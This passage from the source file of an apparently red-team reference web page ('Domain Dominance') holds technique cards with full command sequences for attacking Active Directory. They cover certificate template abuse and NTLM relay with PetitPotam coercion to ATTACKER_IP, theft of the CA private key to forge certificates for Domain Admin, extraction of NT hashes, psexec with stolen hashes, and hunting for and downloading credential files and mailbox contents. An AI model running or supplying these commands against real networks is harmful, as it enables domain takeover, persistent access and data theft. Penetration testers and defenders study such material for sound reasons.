openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Rubeus — authenticate with certificate (PKINIT) + get NT hash:
execute-assembly /tools/Rubeus.exe asktgt \
  /user:administrator \
  /certificate:admin.pfx \
  /getcredentials /nowrap
# Returns: TGT + NT hash of administrator via UnPAC-the-Hash

# Certipy (all-in-one from Linux):
certipy req -u lowpriv@corp.local -p Password -dc-ip DC01 -target CA.corp.local -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip DC01
# Returns: TGT + NT hash

# --- ESC8: NTLM RELAY TO ADCS HTTP ---
# Step 1: Set up ntlmrelayx targeting ADCS enrollment endpoint
ntlmrelayx.py -t http://CA.corp.local/certsrv/mscep/mscep.dll --adcs --template DomainController

# Step 2: Coerce DC authentication (PetitPotam)
python3 PetitPotam.py -u lowpriv -p Password ATTACKER_IP DC01.corp.local
# DC authenticates to attacker → relayed to ADCS → DC certificate issued

# Step 3: Authenticate as DC using the certificate
certipy auth -pfx dc01.pfx -dc-ip DC01
# Returns: DC's NT hash — use for DCSync

# --- ESC4: MODIFY VULNERABLE TEMPLATE ---
# If you have write access on a template, make it ESC1-vulnerable then exploit
certipy template -u lowpriv@corp.local -p Password -template VulnTemplate -save-old
certipy template -u lowpriv@corp.local -p Password -template VulnTemplate -configuration VulnTemplate.json
# Modify template to allow SAN + low priv enrollment, then ESC1 attack

# Restore original template afterward:
certipy template -u lowpriv@corp.local -p Password -template VulnTemplate -configuration VulnTemplate.json.old`
      }
    ]
  },
  {
    id: 'forged-certs',
    title: 'Forged Certificates — CA Key Theft & Persistence',
    subtitle: 'Steal the CA private key to forge certificates for any user indefinitely',
    tags: ['CA key theft', 'PKINIT', 'UnPAC-the-hash', 'Certipy', 'forged cert', 'golden cert'],
    accentColor: 'green',
    overview: 'Stealing the Certificate Authority\'s private key allows forging certificates for any user in the domain indefinitely — a persistence mechanism that survives krbtgt rotation, password resets, and DC rebuilds. Forged certificates are cryptographically valid and issued by the trusted CA. PKINIT authentication with a forged certificate yields both a TGT and (via UnPAC-the-Hash) the target account\'s NT hash. Certipy automates both the CA key backup and certificate forging from Linux.',
    steps: [
      'If you compromise the CA server, steal the CA private key and certificate — forge certs for any user',
      'Forged certificates are valid even after password changes and are nearly impossible to detect',
      'CA key theft: use SharpDPAPI or Certipy on the CA server to extract the private key',
      'Forge a certificate for any user (e.g., Domain Admin) using the stolen CA key',
      'UnPAC-the-Hash: request a TGT via PKINIT with a cert, then use U2U to get the NT hash from the PAC',
      'The stolen CA key provides persistent access even after krbtgt rotation',
    ],
    commands: [
      {
        title: 'CA key theft and certificate forging',
        code: `# Step 1: Extract CA private key (on CA server as local admin)
# Certipy (Linux — from a remote DA session)
certipy ca -backup -ca "CORP-CA" -u Administrator@corp.local -p Password -target CA.corp.local
# Outputs: CORP-CA.pfx

# SharpDPAPI (Windows — on CA server)
execute-assembly /path/to/SharpDPAPI.exe certificates /machine /server:CA.corp.local

# Step 2: Forge certificate for Domain Admin
certipy forge -ca-pfx CORP-CA.pfx -upn Administrator@corp.local -subject "CN=Administrator"
# Outputs: administrator_forged.pfx

# Step 3: Authenticate with forged cert (get TGT + NT hash)
certipy auth -pfx administrator_forged.pfx -domain corp.local -dc-ip DC01
# Outputs: TGT + NT hash of Administrator

# UnPAC-the-Hash (get NT hash via PKINIT)
execute-assembly /path/to/Rubeus.exe asktgt /user:Administrator /certificate:<BASE64_PFX> /password:certpass /getcredentials /nowrap /domain:corp.local
# /getcredentials: uses U2U to extract NT hash from PAC

# Use NT hash or TGT
impacket-psexec -hashes :NT_HASH CORP/Administrator@DC01`
      }
    ]
  },
  {
    id: 'data-hunting',
    title: 'Data Hunting & Exfiltration',
    subtitle: 'Find and extract sensitive data from file shares, databases, and endpoints',
    tags: ['Snaffler', 'file shares', 'databases', 'credentials', 'data hunting', 'exfil'],
    accentColor: 'green',
    overview: 'Data hunting identifies the sensitive information that justifies the attack path — credentials, private keys, PII, financial data, and intellectual property. Snaffler automatically crawls all accessible file shares and scores findings by sensitivity (credentials, private keys, connection strings). MailSniper searches Exchange/O365 mailboxes for keywords across the entire organisation with admin impersonation rights. Documenting this evidence demonstrates real business impact in the final report.',
    steps: [
      'Snaffler: automated sensitive file discovery across accessible file shares — find passwords, keys, configs',
      'Enumerate all accessible file shares in the domain',
      'Hunt for: password files, config files with credentials, private keys, AWS/Azure creds, source code',
      'Database access: query MSSQL for sensitive tables (users, passwords, PII)',
      'Email harvest: use MailSniper to search Exchange/O365 for keywords across the org',
      'Document evidence: collect files that demonstrate the business impact of the engagement',
    ],
    commands: [
      {
        title: 'Data hunting with Snaffler and share enumeration',
        code: `# Snaffler — automated sensitive file discovery
execute-assembly /path/to/Snaffler.exe -s -o snaffler_output.txt
# Automatically finds: credentials, config files, private keys, connection strings
# Across all accessible shares in the domain

# Manual share enumeration
shell net view /domain:corp.local
Invoke-ShareFinder -Verbose -CheckShareAccess   # PowerView

# Search file shares for keywords
shell findstr /si password \\fileserver\share\*.txt \\fileserver\share\*.xml \\fileserver\share\*.config
shell dir \\fileserver\share /s /b | findstr -i "password pass cred secret key"

# Database enumeration
# After xp_cmdshell access:
SELECT name FROM sys.databases
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%password%'
SELECT TOP 100 * FROM Users

# Email search with MailSniper
Import-Module MailSniper.ps1
Invoke-GlobalMailSearch -ImpersonationAccount administrator -ExchHostname mail.corp.local -OutputCsv results.csv
Find-MailboxDelegates -ExchHostname mail.corp.local | Where-Object { $_.User -match "admin" }

# Download identified files via beacon
download \\fileserver\share\config\web.config
download \\fileserver\share\IT\credentials.xlsx`
      }
    ]
  },
];

export default function DomainDominance() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Domain </span><span className="text-emerald-400">Dominance</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Silver/Golden/Diamond Tickets • Forged Certificates • Data Hunting</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {[...techniques].map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}